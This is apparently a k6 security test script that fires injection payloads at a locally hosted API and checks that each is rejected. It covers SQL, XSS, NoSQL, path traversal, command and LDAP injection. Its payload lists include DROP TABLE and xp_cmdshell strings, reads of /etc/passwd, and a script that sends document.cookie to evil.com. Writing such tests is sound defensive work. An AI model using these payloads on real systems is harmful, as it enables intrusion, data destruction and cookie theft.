/**
 * SQL Injection and XSS Security Tests
 * Tests injection attack prevention (NFR-004)
 *
 * Test Coverage:
 * - SQL Injection (SQLi) prevention
 * - Cross-Site Scripting (XSS) prevention
 * - NoSQL Injection prevention
 * - Command Injection prevention
 * - Path Traversal prevention
 * - XML External Entity (XXE) prevention
 */

import http from 'k6/http'
import { check, group, sleep } from 'k6'
import { Counter, Rate } from 'k6/metrics'

const sqlInjectionAttempts = new Counter('sql_injection_attempts')
const xssAttempts = new Counter('xss_attempts')
const injectionPrevented = new Rate('injection_prevented_rate')
const vulnerabilitiesFound = new Counter('vulnerabilities_found')

const API_BASE_URL = __ENV.API_BASE_URL || 'http://localhost:5000'

/**
 * SQL Injection payloads (common attack vectors)
 */
const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "admin' --",
  "admin' #",
  "admin'/*",
  "' or 1=1--",
  "' or 1=1#",
  "' or 1=1/*",
  "') or '1'='1--",
  "') or ('1'='1--",
  "1' UNION SELECT NULL--",
  "1' UNION SELECT NULL, NULL--",
  "' UNION SELECT 1,2,3--",
  "1; DROP TABLE users--",
  "1'; DROP TABLE users--",
  "'; EXEC xp_cmdshell('dir')--",
  "1' AND SLEEP(5)--",
  "1' WAITFOR DELAY '00:00:05'--",
]

/**
 * XSS payloads (common attack vectors)
 */
const XSS_PAYLOADS = [
  "<script>alert('XSS')</script>",
  '<script>alert(String.fromCharCode(88,83,83))</script>',
  "<img src=x onerror=alert('XSS')>",
  "<svg/onload=alert('XSS')>",
  "<iframe src=javascript:alert('XSS')>",
  "<body onload=alert('XSS')>",
  '<input onfocus=alert("XSS") autofocus>',
  '<select onfocus=alert("XSS") autofocus>',
  '<textarea onfocus=alert("XSS") autofocus>',
  '<keygen onfocus=alert("XSS") autofocus>',
  '<video><source onerror="alert(\'XSS\')">',
  '<audio src=x onerror=alert("XSS")>',
  '<details open ontoggle=alert("XSS")>',
  'javascript:alert("XSS")',
  'data:text/html,<script>alert("XSS")</script>',
  '<a href="javascript:alert(\'XSS\')">Click</a>',
  "<img src='x' onerror='alert(document.cookie)'>",
  '<script>fetch("http://evil.com/?cookie="+document.cookie)</script>',
]

/**
 * NoSQL Injection payloads
 */
const NOSQL_INJECTION_PAYLOADS = [
  { $gt: '' },
  { $ne: null },
  { $nin: [] },
  { $regex: '.*' },
  "'; return true; var x='",
  { username: { $regex: '.*' }, password: { $regex: '.*' } },
]

/**
 * Path Traversal payloads
 */
const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '..%2F..%2F..%2Fetc%2Fpasswd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '/etc/passwd%00',
  '../../../../../../../etc/passwd',
]

/**
 * Test Options
 */
export const options = {
  stages: [
    { duration: '30s', target: 5 },
    { duration: '2m', target: 5 },
    { duration: '30s', target: 0 },
  ],
  thresholds: {
    injection_prevented_rate: ['rate>0.99'], // 99% of injection attempts should be prevented
    vulnerabilities_found: ['count==0'], // No vulnerabilities should be found
  },
}

/**
 * Login helper
 */
function login() {
  const payload = JSON.stringify({
    email: 'testuser@test.com',
    password: 'TestPassword123!',
  })

  const res = http.post(`${API_BASE_URL}/api/auth/login`, payload, {
    headers: { 'Content-Type': 'application/json' },
  })

  if (res.status === 200) {
    try {
      return JSON.parse(res.body).token
    } catch (e) {
      return null
    }
  }

  return null
}

/**
 * Main test scenario
 */
export default function () {
  const token = login()

  // Test 1: SQL Injection in Login
  group('SQL Injection - Authentication', () => {
    SQL_INJECTION_PAYLOADS.forEach(payload => {
      const loginPayload = JSON.stringify({
        email: `test${payload}@test.com`,
        password: payload,
      })

      const res = http.post(`${API_BASE_URL}/api/auth/login`, loginPayload, {
        headers: { 'Content-Type': 'application/json' },
      })

      sqlInjectionAttempts.add(1)

      const prevented = check(res, {
        'SQL injection in login prevented': r => r.status === 400 || r.status === 401,
        'No SQL error message exposed': r => !r.body.includes('SQL') && !r.body.includes('syntax'),
      })

      injectionPrevented.add(prevented)

      if (!prevented || res.status === 200) {
        console.error(`SQL injection vulnerability found in login: ${payload}`)
        vulnerabilitiesFound.add(1)
      }

      sleep(0.1)
    })
  })

  sleep(1)

  // Test 2: SQL Injection in Search/Query Parameters
  group('SQL Injection - Query Parameters', () => {
    SQL_INJECTION_PAYLOADS.forEach(payload => {
      const res = http.get(
        `${API_BASE_URL}/api/forum/posts?search=${encodeURIComponent(payload)}`,
        token
          ? {
              headers: { Authorization: `Bearer ${token}` },
            }
          : {},
      )

      sqlInjectionAttempts.add(1)

      const prevented = check(res, {
        'SQL injection in search prevented': r => r.status !== 500,
        'No SQL error in response': r => !r.body.includes('SQL') && !r.body.includes('syntax'),
      })

      injectionPrevented.add(prevented)

      if (!prevented) {
        console.error(`SQL injection vulnerability found in search: ${payload}`)
        vulnerabilitiesFound.add(1)
      }

      sleep(0.1)
    })
  })

  sleep(1)

  // Test 3: SQL Injection in POST Body
  group('SQL Injection - POST Body', () => {
    if (!token) {
      console.warn('Skipping POST body test - no auth token')
      return
    }

    SQL_INJECTION_PAYLOADS.forEach(payload => {
      const postPayload = JSON.stringify({
        title: `Test Post ${payload}`,
        content: payload,
        category: payload,
      })

      const res = http.post(`${API_BASE_URL}/api/forum/posts`, postPayload, {
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`,
        },
      })

      sqlInjectionAttempts.add(1)

      const prevented = check(res, {
        'SQL injection in post body prevented': r => r.status === 400 || r.status === 201,
        'No SQL error exposed': r => !r.body.includes('SQL'),
      })

      injectionPrevented.add(prevented)

      if (res.status === 500 || (res.body && res.body.includes('SQL'))) {
        console.error(`SQL injection vulnerability found in POST body: ${payload}`)
        vulnerabilitiesFound.add(1)
      }

      sleep(0.1)
    })
  })

  sleep(1)

  // Test 4: XSS in Input Fields
  group('XSS - Input Fields', () => {
    if (!token) {
      console.warn('Skipping XSS test - no auth token')
      return
    }

    XSS_PAYLOADS.forEach(payload => {
      const postPayload = JSON.stringify({
        title: `Test ${payload}`,
        content: payload,
      })

      const createRes = http.post(`${API_BASE_URL}/api/forum/posts`, postPayload, {
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`,
        },
      })

      xssAttempts.add(1)

      let prevented = true

      // Check if payload was sanitized in creation response
      if (createRes.status === 201 || createRes.status === 200) {
        const sanitized = check(createRes, {
          'XSS payload sanitized on create': r =>
            !r.body.includes('<script>') && !r.body.includes('onerror='),
        })

        if (!sanitized) {
          console.error(`XSS vulnerability found in create response: ${payload}`)
          vulnerabilitiesFound.add(1)
          prevented = false
        }

        // Fetch the post and check if payload is sanitized
        let postId = null
        try {
          postId = JSON.parse(createRes.body).postId
        } catch (e) {
          // Ignore
        }

        if (postId) {
          const getRes = http.get(`${API_BASE_URL}/api/forum/posts/${postId}`, {
            headers: { Authorization: `Bearer ${token}` },
          })

          const getSanitized = check(getRes, {
            'XSS payload sanitized on retrieve': r =>
              !r.body.includes('<script>') && !r.body.includes('onerror='),
          })

          if (!getSanitized) {
            console.error(`XSS vulnerability found in GET response: ${payload}`)
            vulnerabilitiesFound.add(1)
            prevented = false
          }
        }
      }

      injectionPrevented.add(prevented)

      sleep(0.1)
    })
  })

  sleep(1)

  // Test 5: NoSQL Injection
  group('NoSQL Injection', () => {
    NOSQL_INJECTION_PAYLOADS.forEach((payload, index) => {
      const loginPayload = JSON.stringify({
        email: payload,
        password: payload,
      })

      const res = http.post(`${API_BASE_URL}/api/auth/login`, loginPayload, {
        headers: { 'Content-Type': 'application/json' },
      })

      const prevented = check(res, {
        'NoSQL injection prevented': r => r.status === 400 || r.status === 401,
        'Not authenticated via NoSQL injection': r => r.status !== 200,
      })

      injectionPrevented.add(prevented)

      if (!prevented || res.status === 200) {
        console.error(`NoSQL injection vulnerability found: ${JSON.stringify(payload)}`)
        vulnerabilitiesFound.add(1)
      }

      sleep(0.1)
    })
  })

  sleep(1)

  // Test 6: Path Traversal
  group('Path Traversal', () => {
    if (!token) {
      console.warn('Skipping path traversal test - no auth token')
      return
    }

    PATH_TRAVERSAL_PAYLOADS.forEach(payload => {
      const res = http.get(`${API_BASE_URL}/api/resources/${encodeURIComponent(payload)}`, {
        headers: { Authorization: `Bearer ${token}` },
      })

      const prevented = check(res, {
        'Path traversal prevented': r => r.status === 400 || r.status === 404,
        'No system file content exposed': r =>
          !r.body.includes('root:') && !r.body.includes('Administrator'),
      })

      injectionPrevented.add(prevented)

      if (!prevented && (res.body.includes('root:') || res.body.includes('Administrator'))) {
        console.error(`Path traversal vulnerability found: ${payload}`)
        vulnerabilitiesFound.add(1)
      }

      sleep(0.1)
    })
  })

  sleep(1)

  // Test 7: Command Injection
  group('Command Injection', () => {
    if (!token) {
      console.warn('Skipping command injection test - no auth token')
      return
    }

    const commandPayloads = [
      '; ls -la',
      '& dir',
      '| whoami',
      '`cat /etc/passwd`',
      '$(cat /etc/passwd)',
      '; ping -c 10 localhost',
    ]

    commandPayloads.forEach(payload => {
      const searchRes = http.get(
        `${API_BASE_URL}/api/resources/search?q=${encodeURIComponent(payload)}`,
        {
          headers: { Authorization: `Bearer ${token}` },
        },
      )

      const prevented = check(searchRes, {
        'Command injection prevented': r => r.status !== 500,
        'No command output in response': r =>
          !r.body.includes('total ') && !r.body.includes('root:') && !r.body.includes('Volume'),
      })

      injectionPrevented.add(prevented)

      if (!prevented) {
        console.error(`Command injection vulnerability found: ${payload}`)
        vulnerabilitiesFound.add(1)
      }

      sleep(0.1)
    })
  })

  sleep(1)

  // Test 8: LDAP Injection
  group('LDAP Injection', () => {
    const ldapPayloads = ['*', '*)(uid=*', 'admin)(|(password=*))', '*)(objectClass=*']

    ldapPayloads.forEach(payload => {
      const searchRes = http.get(
        `${API_BASE_URL}/api/users/search?q=${encodeURIComponent(payload)}`,
        token
          ? {
              headers: { Authorization: `Bearer ${token}` },
            }
          : {},
      )

      const prevented = check(searchRes, {
        'LDAP injection prevented': r => r.status === 400 || r.status === 401 || r.status === 404,
      })

      injectionPrevented.add(prevented)

      if (!prevented && searchRes.status === 200) {
        console.error(`LDAP injection vulnerability found: ${payload}`)
        vulnerabilitiesFound.add(1)
      }

      sleep(0.1)
    })
  })

  sleep(2)
}

/**
 * Setup
 */
export function setup() {
  console.log('Starting injection attack tests...')
  return { startTime: Date.now() }
}

/**
 * Teardown
 */
export function teardown(data) {
  const duration = (Date.now() - data.startTime) / 1000
  console.log(`Injection tests completed in ${duration.toFixed(2)} seconds`)
}

/**
 * Handle summary
 */
export function handleSummary(data) {
  const preventionRate = data.metrics.injection_prevented_rate?.values.rate || 0
  const vulnerabilities = data.metrics.vulnerabilities_found?.values.count || 0
  const sqlAttempts = data.metrics.sql_injection_attempts?.values.count || 0
  const xssAttempts = data.metrics.xss_attempts?.values.count || 0

  console.log('\n=== Injection Attack Test Summary ===')
  console.log(
    `Prevention Rate: ${(preventionRate * 100).toFixed(2)}% (Target: >99%) - ${preventionRate > 0.99 ? '✓ PASS' : '✗ FAIL'}`,
  )
  console.log(
    `Vulnerabilities Found: ${vulnerabilities} (Target: 0) - ${vulnerabilities === 0 ? '✓ PASS' : '✗ FAIL'}`,
  )
  console.log(`SQL Injection Attempts: ${sqlAttempts}`)
  console.log(`XSS Attempts: ${xssAttempts}`)

  if (vulnerabilities > 0) {
    console.log('\n🚨 CRITICAL: Injection vulnerabilities detected!')
    console.log('Review logs for payload details and patch immediately.')
  }

  return {
    'security-reports/injection-test.json': JSON.stringify(data, null, 2),
    stdout: JSON.stringify(data, null, 2),
  }
}
